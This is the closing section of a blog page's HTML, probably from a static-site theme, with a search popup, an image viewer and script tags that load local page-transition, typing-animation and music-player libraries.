            <i class="fa-regular fa-cog fa-spin"></i>
        </li>
        
            <li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
                <i class="arrow-up fas fa-arrow-up"></i>
                <span class="percent"></span>
            </li>
        
        
    </ul>
</div>

    </div>

    <div class="image-viewer-container">
    <img src="">
</div>


    
        <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
          <span class="search-input-field-pre">
            <i class="fa-solid fa-keyboard"></i>
          </span>
            <div class="search-input-container">
                <input autocomplete="off"
                       autocorrect="off"
                       autocapitalize="off"
                       placeholder="搜索..."
                       spellcheck="false"
                       type="search"
                       class="search-input"
                >
            </div>
            <span class="popup-btn-close">
                <i class="fa-solid fa-times"></i>
            </span>
        </div>
        <div id="search-result">
            <div id="no-result">
                <i class="fa-solid fa-spinner fa-spin-pulse fa-5x fa-fw"></i>
            </div>
        </div>
    </div>
</div>

    

</main>


    
<script src="/js/libs/Swup.min.js"></script>

<script src="/js/libs/SwupSlideTheme.min.js"></script>

<script src="/js/libs/SwupScriptsPlugin.min.js"></script>

<script src="/js/libs/SwupProgressPlugin.min.js"></script>

<script src="/js/libs/SwupScrollPlugin.min.js"></script>

<script src="/js/libs/SwupPreloadPlugin.min.js"></script>

<script>
    const swup = new Swup({
        plugins: [
            new SwupScriptsPlugin({
                optin: true,
            }),
            new SwupProgressPlugin(),
            new SwupScrollPlugin({
                offset: 80,
            }),
            new SwupSlideTheme({
                mainElement: ".main-content-body",
            }),
            new SwupPreloadPlugin(),
        ],
        containers: ["#swup"],
    });
</script>







<script src="/js/tools/imageViewer.js" type="module"></script>

<script src="/js/utils.js" type="module"></script>

<script src="/js/main.js" type="module"></script>

<script src="/js/layouts/navbarShrink.js" type="module"></script>

<script src="/js/tools/scrollTopBottom.js" type="module"></script>

<script src="/js/tools/lightDarkSwitch.js" type="module"></script>

<script src="/js/layouts/categoryList.js" type="module"></script>



    
<script src="/js/tools/localSearch.js" type="module"></script>




    
<script src="/js/tools/codeBlock.js" type="module"></script>




    
<script src="/js/layouts/lazyload.js" type="module"></script>




    
<script src="/js/tools/runtime.js"></script>

    
<script src="/js/libs/odometer.min.js"></script>

    
<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">




  
<script src="/js/libs/Typed.min.js"></script>

  
<script src="/js/plugins/typed.js" type="module"></script>








    
<script src="/js/libs/anime.min.js"></script>



<div class="post-scripts" data-swup-reload-script>
    
        
<script src="/js/tools/tocToggle.js" type="module"></script>

<script src="/js/layouts/toc.js" type="module"></script>

<script src="/js/plugins/tabs.js" type="module"></script>

    
</div>


    <div id="aplayer"></div>

<script src="/js/libs/APlayer.min.js"></script>


<script src="/js/plugins/aplayer.js"></script>


</body>
</html>
